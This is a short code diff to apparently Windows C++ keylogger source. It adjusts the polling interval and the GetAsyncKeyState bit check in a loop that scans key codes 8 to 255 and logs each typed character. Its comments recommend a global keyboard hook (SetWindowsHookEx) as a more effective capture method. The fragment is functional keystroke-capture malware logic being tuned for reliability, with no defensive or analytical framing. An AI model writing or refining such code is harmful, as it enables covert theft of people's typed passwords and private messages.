@@ -147,13 +147,13 @@ void keylogger::Keylogger()
    
     while (keyloggerON) {
         if (keyloggerRunning) {
-            Sleep(10); // Avoid CPU overuse
+            Sleep(70); // Avoid CPU overuse
 
             // The loop for keys should be more targeted or use a different approach.
             // A more effective method is to use a global keyboard hook (SetWindowsHookEx).
             // This is a simplified loop that checks common key codes.
             for (int key = 8; key <= 255; ++key) {
-                if (GetAsyncKeyState(key) & 0x8000) {
+                if (GetAsyncKeyState(key) & 0x0001) {
                     char c = VkCodeToChar(key);
                     if (c != 0) {
                         LOG(std::string(1, c));
